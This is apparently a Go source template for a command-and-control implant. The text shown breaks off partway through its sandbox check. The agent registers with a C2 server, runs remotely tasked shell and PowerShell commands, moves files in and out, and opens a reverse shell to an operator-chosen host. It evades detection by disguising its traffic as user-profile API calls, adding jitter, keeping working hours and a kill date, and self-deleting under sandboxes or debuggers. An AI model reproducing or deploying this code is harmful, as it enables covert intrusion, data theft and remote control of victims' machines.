package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/fernet/fernet-go"
)

type {AGENT_STRUCT_NAME} struct {
	{AGENT_C2_URL_FIELD}                string
	{AGENT_ID_FIELD}                    string
	{AGENT_HEADERS_FIELD}               map[string]string
	{AGENT_HEARTBEAT_INTERVAL_FIELD}    int
	{AGENT_JITTER_FIELD}                float64
	{AGENT_REGISTER_URI_FIELD}          string
	{AGENT_TASKS_URI_FIELD}             string
	{AGENT_RESULTS_URI_FIELD}           string
	{AGENT_INTERACTIVE_URI_FIELD}       string
	{AGENT_INTERACTIVE_STATUS_URI_FIELD} string
	{AGENT_RUNNING_FIELD}               bool
	{AGENT_INTERACTIVE_MODE_FIELD}      bool
	{AGENT_HOSTNAME_FIELD}              string
	{AGENT_USERNAME_FIELD}              string
	{AGENT_OSINFO_FIELD}                string
	{AGENT_SECRET_KEY_FIELD}            *fernet.Key
	{AGENT_CURRENT_INTERACTIVE_TASK_FIELD} string
	{AGENT_DISABLE_SANDBOX_FIELD}       bool
	{AGENT_KILL_DATE_FIELD}             string
	{AGENT_WORKING_HOURS_FIELD}         struct {
		StartHour int      `json:"start_hour"`
		EndHour   int      `json:"end_hour"`
		Timezone  string   `json:"timezone"`
		Days      []int    `json:"days"`
	}
}

type {TASK_STRUCT_NAME} struct {
	{TASK_ID_FIELD}      int64  `json:"id"`
	{TASK_COMMAND_FIELD} string `json:"command"`
}

type {TASK_RESULT_STRUCT_NAME} struct {
	{TASK_RESULT_TASK_ID_FIELD} string `json:"task_id"`
	{TASK_RESULT_RESULT_FIELD}  string `json:"result"`
}

type {API_RESPONSE_STRUCT_NAME} struct {
	Status   string      `json:"status"`
	Tasks    []{TASK_STRUCT_NAME}      `json:"tasks,omitempty"`
	Interval int         `json:"checkin_interval,omitempty"`
	Jitter   float64     `json:"jitter,omitempty"`
	InteractiveMode bool `json:"interactive_mode,omitempty"`
	Command  string      `json:"command,omitempty"`
	TaskID   string      `json:"task_id,omitempty"`
}

func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL string, disableSandbox bool) (*{AGENT_STRUCT_NAME}, error) {
	var fernetKey fernet.Key

	if secretKey != "" {
		key, err := fernet.DecodeKey(secretKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decode secret key: %v", err)
		}
		fernetKey = *key
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = "unknown"
	}

	osInfo := runtime.GOOS + " " + runtime.GOARCH

	agent := &{AGENT_STRUCT_NAME}{
		{AGENT_C2_URL_FIELD}:               c2URL,
		{AGENT_ID_FIELD}:             agentID,
		{AGENT_HEADERS_FIELD}:             map[string]string{"User-Agent": "Go C2 Agent"},
		{AGENT_HEARTBEAT_INTERVAL_FIELD}:   60,
		{AGENT_JITTER_FIELD}:              0.2,
		{AGENT_REGISTER_URI_FIELD}:         "/api/users/register",
		{AGENT_TASKS_URI_FIELD}:            "/api/users/{agent_id}/profile",
		{AGENT_RESULTS_URI_FIELD}:          "/api/users/{agent_id}/activity",
		{AGENT_INTERACTIVE_URI_FIELD}:      "/api/users/{agent_id}/settings",
		{AGENT_INTERACTIVE_STATUS_URI_FIELD}: "/api/users/{agent_id}/status",
		{AGENT_HOSTNAME_FIELD}:            hostname,
		{AGENT_USERNAME_FIELD}:            username,
		{AGENT_OSINFO_FIELD}:              osInfo,
		{AGENT_SECRET_KEY_FIELD}:           &fernetKey,
		{AGENT_INTERACTIVE_MODE_FIELD}:     false,
		{AGENT_RUNNING_FIELD}:             false,
		{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}: "",
		{AGENT_DISABLE_SANDBOX_FIELD}:      disableSandbox,
		{AGENT_KILL_DATE_FIELD}:            "{KILL_DATE}",
		{AGENT_WORKING_HOURS_FIELD}:        struct {
			StartHour int      `json:"start_hour"`
			EndHour   int      `json:"end_hour"`
			Timezone  string   `json:"timezone"`
			Days      []int    `json:"days"`
		}{
			StartHour: {WORKING_HOURS_START_HOUR},
			EndHour:   {WORKING_HOURS_END_HOUR},
			Timezone:  "{WORKING_HOURS_TIMEZONE}",
			Days:      []int{{WORKING_HOURS_DAYS}},
		},
	}

	return agent, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_ENCRYPT_DATA_FUNC}(data string) (string, error) {
	if a.{AGENT_SECRET_KEY_FIELD} == nil {
		return data, nil
	}

	encrypted, err := fernet.EncryptAndSign([]byte(data), a.{AGENT_SECRET_KEY_FIELD})
	if err != nil {
		return data, err
	}

	return base64.StdEncoding.EncodeToString(encrypted), nil  // Use standard base64 encoding for consistency
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_DECRYPT_DATA_FUNC}(encryptedData string) (string, error) {
	if a.{AGENT_SECRET_KEY_FIELD} == nil {
		return encryptedData, nil
	}

	// First try URL encoding (most common for Fernet tokens)
	decoded, err := base64.URLEncoding.DecodeString(encryptedData)
	if err != nil {
		// If URL encoding fails, try standard base64 encoding
		decoded, err = base64.StdEncoding.DecodeString(encryptedData)
		if err != nil {
			return encryptedData, err
		}
	}

	keys := []*fernet.Key{a.{AGENT_SECRET_KEY_FIELD}}
	decrypted := fernet.VerifyAndDecrypt(decoded, 0, keys) // 0 TTL means no expiration checking

	if decrypted == nil {
		return encryptedData, fmt.Errorf("failed to decrypt data")
	}

	return string(decrypted), nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data interface{}) (*{API_RESPONSE_STRUCT_NAME}, error) {
	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)
	url := a.{AGENT_C2_URL_FIELD} + uri

	// fmt.Printf("[DEBUG] Preparing API request - Method: %s, URL: %s\n", method, url)
	// if data != nil {
	// 	fmt.Printf("[DEBUG] Request data: %v\n", data)
	// }

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: false,  // Keep connections alive for efficiency
		MaxIdleConns: 10,
		IdleConnTimeout: 90 * time.Second,
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	var req *http.Request
	var err error

	if data != nil {
		jsonData, err := json.Marshal(data)
		if err != nil {
			fmt.Printf("[DEBUG] Failed to marshal JSON data: %v\n", err)
			return nil, err
		}
		// fmt.Printf("[DEBUG] JSON data to send: %s\n", string(jsonData))
		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
			return nil, err
		}
		req.Header.Set("Content-Type", "application/json")
	} else {
		// fmt.Println("[DEBUG] Creating request with no body")
		req, err = http.NewRequest(method, url, nil)
		if err != nil {
			fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
			return nil, err
		}
	}

	for key, value := range a.{AGENT_HEADERS_FIELD} {
		req.Header.Set(key, value)
	}

	// fmt.Println("[DEBUG] Sending HTTP request...")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[DEBUG] HTTP request failed: %v\n", err)
		return nil, err
	}
	defer resp.Body.Close()

	// fmt.Printf("[DEBUG] HTTP response status code: %d\n", resp.StatusCode)

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[DEBUG] Failed to read response body: %v\n", err)
		return nil, err
	}

	// fmt.Printf("[DEBUG] HTTP response body: %s\n", string(body))

	if resp.StatusCode != 200 {
		fmt.Printf("[DEBUG] HTTP error received: %d\n", resp.StatusCode)
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	var apiResp {API_RESPONSE_STRUCT_NAME}
	err = json.Unmarshal(body, &apiResp)
	if err != nil {
		fmt.Printf("[DEBUG] Failed to unmarshal response JSON: %v\n", err)
		return nil, err
	}

	// fmt.Printf("[DEBUG] Parsed API response: %+v\n", apiResp)
	return &apiResp, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
	// fmt.Println("[DEBUG] Starting agent registration process")
	if !a.{AGENT_DISABLE_SANDBOX_FIELD} {
		// fmt.Println("[DEBUG] Performing sandbox check...")
		if a.{AGENT_CHECK_SANDBOX_FUNC}() {
			// fmt.Println("[DEBUG] Sandbox detected, agent self-deleting")
			a.{AGENT_SELF_DELETE_FUNC}()
			return fmt.Errorf("sandbox detected, agent self-deleting")
		}

		// fmt.Println("[DEBUG] Performing debugger check...")
		if a.{AGENT_CHECK_DEBUGGERS_FUNC}() {
			// fmt.Println("[DEBUG] Debugger detected, agent self-deleting")
			a.{AGENT_SELF_DELETE_FUNC}()
			return fmt.Errorf("debugger detected, agent self-deleting")
		}
	}

	data := map[string]interface{}{
		"agent_id":         a.{AGENT_ID_FIELD},
		"hostname":         a.{AGENT_HOSTNAME_FIELD},
		"os_info":          a.{AGENT_OSINFO_FIELD},
		"user":             a.{AGENT_USERNAME_FIELD},
		"listener_id":      "web_app_default", // This should match the listener name
		"interactive_capable": true,
		"secret_key":       a.{AGENT_SECRET_KEY_FIELD},
	}

	// fmt.Printf("[DEBUG] Registration data: %+v\n", data)
	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_REGISTER_URI_FIELD}, data)
	if err != nil {
		fmt.Printf("[DEBUG] Registration request failed: %v\n", err)
		return err
	}

	// fmt.Printf("[DEBUG] Registration response: %+v\n", resp)
	if resp.Status == "success" {
		// fmt.Println("[DEBUG] Registration successful")
		if resp.Interval != 0 {
			// fmt.Printf("[DEBUG] Updating heartbeat interval to: %d\n", resp.Interval)
			a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = resp.Interval
		}
		if resp.Jitter != 0 {
			// fmt.Printf("[DEBUG] Updating jitter to: %f\n", resp.Jitter)
			a.{AGENT_JITTER_FIELD} = resp.Jitter
		}
		return nil
	}

	// fmt.Printf("[DEBUG] Registration failed with status: %s\n", resp.Status)
	return fmt.Errorf("registration failed: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, error) {
	// fmt.Printf("[DEBUG] Attempting to get tasks from URI: %s\n", a.{AGENT_TASKS_URI_FIELD})
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_TASKS_URI_FIELD}, nil)
	if err != nil {
		// fmt.Printf("[DEBUG] Failed to send GET request for tasks: %v\n", err)
		return nil, err
	}

	// fmt.Printf("[DEBUG] Got response from server, status: %s\n", resp.Status)
	if resp.Status == "success" {
		tasks := resp.Tasks
		// fmt.Printf("[DEBUG] Successfully retrieved %d tasks from server\n", len(tasks))
		for i := range tasks {
			// fmt.Printf("[DEBUG] Processing task %d, original command: %s\n", i, tasks[i].{TASK_COMMAND_FIELD})
			if a.{AGENT_SECRET_KEY_FIELD} != nil {
				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
				if err == nil {
					// fmt.Printf("[DEBUG] Successfully decrypted command: %s -> %s\n", tasks[i].{TASK_COMMAND_FIELD}, decryptedCmd)
					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
				} else {
					// fmt.Printf("[DEBUG] Failed to decrypt command: %v\n", err)
				}
			} else {
				// fmt.Println("[DEBUG] No encryption key, skipping decryption")
			}
		}
		return tasks, nil
	}

	// fmt.Printf("[DEBUG] Server returned failure status: %s\n", resp.Status)
	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_INTERACTIVE_STATUS_FUNC}() (bool, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_STATUS_URI_FIELD}, nil)
	if err != nil {
		return false, err
	}

	if resp.Status == "success" {
		return resp.InteractiveMode, nil
	}

	return false, fmt.Errorf("failed to check interactive status: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_INTERACTIVE_COMMAND_FUNC}() (*{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" && resp.Command != "" {
		taskID, err := strconv.ParseInt(resp.TaskID, 10, 64)
		if err != nil {
			taskID = 0 // Default to 0 if parsing fails
		}

		task := &{TASK_STRUCT_NAME}{
			{TASK_ID_FIELD}:      taskID,
			{TASK_COMMAND_FIELD}: resp.Command,
		}

		if a.{AGENT_SECRET_KEY_FIELD} != nil {
			decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
			if err == nil {
				task.{TASK_COMMAND_FIELD} = decryptedCmd
			}
		}

		return task, nil
	}

	return nil, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_INTERACTIVE_URI_FIELD}, data)
	return err
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {

	// fmt.Printf("[DEBUG] Executing command: %s\n", command)

	commandLower := strings.ToLower(strings.TrimSpace(command))
	isPowerShell := false

	powerShellIndicators := []string{
		"powershell", "pwsh", "powershell.exe",
		"$", "get-", "set-", "new-", "remove-", "invoke-",
		"select-", "where-", "foreach-", "out-", "export-",
		"import-", "write-", "read-", "clear-", "update-",
		"|", "get-wmiobject", "get-ciminstance", "start-process",
		"get-service", "stop-service", "restart-service", "set-service",
	}

	patternCount := 0
	for _, pattern := range powerShellIndicators {
		if strings.Contains(commandLower, pattern) {
			patternCount++
		}
	}

	// fmt.Printf("[DEBUG] PowerShell pattern count: %d\n", patternCount)

	isPowerShell = patternCount >= 2 ||
		strings.Contains(commandLower, "get-wmiobject") ||
		strings.Contains(commandLower, "get-ciminstance") ||
		strings.Contains(commandLower, "start-process") ||
		strings.Contains(commandLower, "powershell -")

	// fmt.Printf("[DEBUG] Command is PowerShell: %t\n", isPowerShell)

	if isPowerShell {
		// fmt.Println("[DEBUG] Executing PowerShell command")
		var cmd *exec.Cmd

		if runtime.GOOS == "windows" {
			// fmt.Println("[DEBUG] Running on Windows - using powershell with WindowStyle Hidden")
			cmd = exec.Command("powershell", "-Command", command)
		} else {
			// fmt.Println("[DEBUG] Running on non-Windows - using pwsh")
			cmd = exec.Command("pwsh", "-Command", command)
		}

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			// fmt.Printf("[DEBUG] PowerShell command execution failed: %v\n", err)
			return fmt.Sprintf("[ERROR] PowerShell command execution failed: %v", err)
		}

		output := stdout.String() + stderr.String()
		// fmt.Printf("[DEBUG] PowerShell command output: %s\n", output)
		if output == "" {
			return "[PowerShell command executed successfully - no output]"
		}
		return output
	} else {
		// fmt.Println("[DEBUG] Executing regular command")
		var cmd *exec.Cmd

		if runtime.GOOS == "windows" {
			// fmt.Println("[DEBUG] Running on Windows - using cmd /C")
			cmd = exec.Command("cmd", "/C", command)
		} else {
			// fmt.Println("[DEBUG] Running on non-Windows - using sh -c")
			cmd = exec.Command("sh", "-c", command)
		}

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			// fmt.Printf("[DEBUG] Regular command execution failed: %v\n", err)
			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
		}

		output := stdout.String() + stderr.String()
		// fmt.Printf("[DEBUG] Regular command output: %s\n", output)
		if output == "" {
			return "[Command executed successfully - no output]"
		}
		return output
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
	// fmt.Printf("[DEBUG] Preparing to submit task result for task ID: %s\n", taskID)
	// fmt.Printf("[DEBUG] Result content (first 100 chars): %s...\n", func() string {
	// 	if len(result) > 100 {
	// 		return result[:100]
	// 	}
	// 	return result
	// }())

	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		// fmt.Printf("[DEBUG] Attempting to encrypt result for task %s\n", taskID)
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			// fmt.Printf("[DEBUG] Failed to encrypt result, using original: %v\n", err)
			encryptedResult = result
		} else {
			// fmt.Printf("[DEBUG] Successfully encrypted result for task %s\n", taskID)
		}
	} else {
		// fmt.Printf("[DEBUG] No encryption key, using result as-is for task %s\n", taskID)
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	// fmt.Printf("[DEBUG] Sending POST request to URI: %s\n", a.{AGENT_RESULTS_URI_FIELD})
	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
	if err != nil {
		// fmt.Printf("[DEBUG] Failed to submit task result for task %s: %v\n", taskID, err)
		return err
	} else {
		// fmt.Printf("[DEBUG] Successfully submitted task result for task %s\n", taskID)
		if resp != nil {
			// fmt.Printf("[DEBUG] Server response status: %s\n", resp.Status)
		}
	}
	return nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_MODULE_FUNC}(encodedScript string) string {
	decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to decode module: %v", err)
	}

	return a.{AGENT_EXECUTE_FUNC}(string(decodedScript))
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_UPLOAD_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3)
	if len(parts) != 3 {
		return "[ERROR] Invalid upload command format."
	}

	remotePath := parts[1]
	encodedData := parts[2]

	decodedData, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to decode file content: %v", err)
	}

	err = ioutil.WriteFile(remotePath, decodedData, 0644)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to write file: %v", err)
	}

	return fmt.Sprintf("[SUCCESS] File uploaded to %s", remotePath)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOWNLOAD_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		return "[ERROR] Invalid download command format."
	}

	remotePath := parts[1]

	if _, err := os.Stat(remotePath); os.IsNotExist(err) {
		return fmt.Sprintf("[ERROR] File not found on remote machine: %s", remotePath)
	}

	fileContent, err := ioutil.ReadFile(remotePath)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to read file: %v", err)
	}

	encodedContent := base64.StdEncoding.EncodeToString(fileContent)
	return encodedContent
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_TTY_SHELL_FUNC}(command string) string {
	parts := strings.Split(command, " ")
	var host string
	var port string

	if len(parts) >= 3 {
		host = parts[1]
		port = parts[2]
	} else {
		host = "127.0.0.1"
		port = "5000"
	}

	go func() {
		address := fmt.Sprintf("%s:%s", host, port)

		conn, err := net.Dial("tcp", address)
		if err != nil {
			return
		}
		defer conn.Close()

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "-")
		} else {
			cmd = exec.Command("bash", "-i")
		}

		stdin, err := cmd.StdinPipe()
		if err != nil {
			return
		}
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return
		}
		stderr, err := cmd.StderrPipe()
		if err != nil {
			return
		}

		if err := cmd.Start(); err != nil {
			return
		}

		go func() {
			_, _ = io.Copy(conn, stdout)
		}()

		go func() {
			_, _ = io.Copy(conn, stderr)
		}()

		go func() {
			_, _ = io.Copy(stdin, conn)
		}()

		cmd.Wait()
	}()

	return fmt.Sprintf("[SUCCESS] TTY shell connection initiated to %s:%s", host, port)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_SLEEP_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		return "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
	}

	newSleep, err := strconv.Atoi(parts[1])
	if err != nil {
		return "[ERROR] Sleep interval must be a valid integer"
	}

	if newSleep <= 0 {
		return "[ERROR] Sleep interval must be a positive integer"
	}

	a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = newSleep
	return fmt.Sprintf("[SUCCESS] Sleep interval changed to %d seconds", newSleep)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3) // Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
	if len(parts) < 2 {
		return "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
	}

	encodedBOF := parts[1]
	bofArgs := ""
	if len(parts) > 2 {
		bofArgs = parts[2]
	}

	bofData, err := base64.StdEncoding.DecodeString(encodedBOF)
	if err != nil {
		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
	}

	_ = bofData // PLACEHOLDER - TO BE IMPLMEENTED FR FR LATER
	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
	// fmt.Printf("[DEBUG] Processing command: %s\n", command)

	if strings.HasPrefix(command, "module ") {
		encodedScript := command[7:] // Remove "module " prefix
		// fmt.Printf("[DEBUG] Processing module command with script: %s\n", encodedScript)
		result := a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
		// fmt.Printf("[DEBUG] Module command result: %s\n", result)
		return result
	} else if strings.HasPrefix(command, "upload ") {
		// fmt.Println("[DEBUG] Processing upload command")
		result := a.{AGENT_HANDLE_UPLOAD_FUNC}(command)
		// fmt.Printf("[DEBUG] Upload command result: %s\n", result)
		return result
	} else if strings.HasPrefix(command, "download ") {
		// fmt.Println("[DEBUG] Processing download command")
		result := a.{AGENT_HANDLE_DOWNLOAD_FUNC}(command)
		// fmt.Printf("[DEBUG] Download command result: %s\n", result)
		return result
	} else if strings.HasPrefix(command, "tty_shell") {
		// fmt.Println("[DEBUG] Processing TTY shell command")
		result := a.{AGENT_HANDLE_TTY_SHELL_FUNC}(command)
		// fmt.Printf("[DEBUG] TTY shell command result: %s\n", result)
		return result
	} else if strings.HasPrefix(command, "sleep ") {
		// fmt.Println("[DEBUG] Processing sleep command")
		result := a.{AGENT_HANDLE_SLEEP_FUNC}(command)
		// fmt.Printf("[DEBUG] Sleep command result: %s\n", result)
		return result
	} else if strings.HasPrefix(command, "bof ") {
		// fmt.Println("[DEBUG] Processing BOF command")
		result := a.{AGENT_HANDLE_BOF_FUNC}(command)
		// fmt.Printf("[DEBUG] BOF command result: %s\n", result)
		return result
	} else if command == "kill" {
		// fmt.Println("[DEBUG] Processing kill command")
		a.{AGENT_RUNNING_FIELD} = false
		os.Exit(0)
		return "[SUCCESS] Agent killed"
	} else {
		fmt.Println("[DEBUG] Processing regular command via execute function")
		result := a.{AGENT_EXECUTE_FUNC}(command)
		fmt.Printf("[DEBUG] Regular command result: %s\n", result)
		return result
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
	// fmt.Println("[DEBUG] Agent run function started")

	for {
		// Check kill date first
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			// fmt.Println("[DEBUG] Kill date reached, agent self-deleting")
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		// fmt.Println("[DEBUG] Attempting agent registration...")
		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			// fmt.Println("[DEBUG] Registration successful")
			break
		}
		// fmt.Printf("[DEBUG] Registration failed, will retry in 30 seconds: %v\n", err)
		time.Sleep(30 * time.Second)
	}

	a.{AGENT_RUNNING_FIELD} = true
	checkCount := 0

	// fmt.Println("[DEBUG] Entering main agent loop...")
	for a.{AGENT_RUNNING_FIELD} {
		// Check kill date on each iteration
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			// fmt.Println("[DEBUG] Kill date reached during operation, agent self-deleting")
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		// Check if we're outside working hours
		if !a.{AGENT_CHECK_WORKING_HOURS_FUNC}() {
			// Sleep for 5 minutes and check again
			// fmt.Println("[DEBUG] Outside working hours, sleeping until next check...")
			time.Sleep(5 * time.Minute)
			continue
		}

		checkCount++
		// fmt.Printf("[DEBUG] Loop iteration count: %d\n", checkCount)

		if checkCount%3 == 0 {
			// fmt.Println("[DEBUG] Checking interactive status...")
			shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
			if err == nil {
				// fmt.Printf("[DEBUG] Interactive status check result: should_be_interactive=%t, current_mode=%t\n", shouldBeInteractive, a.{AGENT_INTERACTIVE_MODE_FIELD})
				if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
					a.{AGENT_INTERACTIVE_MODE_FIELD} = true
					// fmt.Println("[DEBUG] Switched to interactive mode")
				} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
					// fmt.Println("[DEBUG] Switched to normal mode")
				}
			} else {
				// fmt.Printf("[DEBUG] Failed to check interactive status: %v\n", err)
			}
		}

		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
			// fmt.Println("[DEBUG] Normal mode - checking for tasks...")
			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
			if err != nil {
				// fmt.Printf("[DEBUG] Failed to get tasks: %v\n", err)
				time.Sleep(30 * time.Second)
				continue
			}

			// fmt.Printf("[DEBUG] Received %d tasks to process\n", len(tasks))

			for _, task := range tasks {
				// fmt.Printf("[DEBUG] Processing task ID: %d, Command: %s\n", task.{TASK_ID_FIELD}, task.{TASK_COMMAND_FIELD})
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
				// fmt.Printf("[DEBUG] Task execution result: %s\n", result)
				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// fmt.Printf("[DEBUG] Failed to submit task result for task %s: %v\n", taskIDStr, err)
				} else {
					// fmt.Printf("[DEBUG] Successfully submitted result for task %s\n", taskIDStr)
				}
			}
		} else {
			// fmt.Println("[DEBUG] Interactive mode - checking for interactive commands...")
			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
			if err != nil {
				// fmt.Printf("[DEBUG] Failed to get interactive command: %v\n", err)
			} else if interactiveTask != nil {
				// fmt.Printf("[DEBUG] Received interactive task ID: %d, Command: %s\n", interactiveTask.{TASK_ID_FIELD}, interactiveTask.{TASK_COMMAND_FIELD})
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
				// fmt.Printf("[DEBUG] Interactive task result: %s\n", result)
				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// fmt.Printf("[DEBUG] Failed to submit interactive result for task %s: %v\n", taskIDStr, err)
				} else {
					// fmt.Printf("[DEBUG] Successfully submitted interactive result for task %s\n", taskIDStr)
				}
			} else {
				// fmt.Println("[DEBUG] No interactive command received")
			}
		}

		baseSleep := float64(a.{AGENT_HEARTBEAT_INTERVAL_FIELD})
		jitterFactor := (rand.Float64() - 0.5) * 2 * a.{AGENT_JITTER_FIELD}
		sleepTime := baseSleep * (1 + jitterFactor)
		if sleepTime < 5 {
			sleepTime = 5
		}
		// fmt.Printf("[DEBUG] Sleeping for %f seconds before next iteration\n", sleepTime)

		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_FUNC}() {
	a.{AGENT_RUNNING_FIELD} = false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cpuCount := runtime.NumCPU()
	if cpuCount < 2 {
		return true
	}

	var totalRAM uint64
	if runtime.GOOS == "linux" {
		if data, err := ioutil.ReadFile("/proc/meminfo"); err == nil {
			lines := strings.Split(string(data), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "MemTotal:") {
					parts := strings.Fields(line)
					if len(parts) >= 2 {
						if kb, err := strconv.ParseUint(parts[1], 10, 64); err == nil {
							totalRAM = kb * 1024 // Convert to bytes
							break
						}
					}
				}
			}
		}
	} else if runtime.GOOS == "windows" {
		if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
		   os.Getenv("VBOX_SESSION") != "" ||
		   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
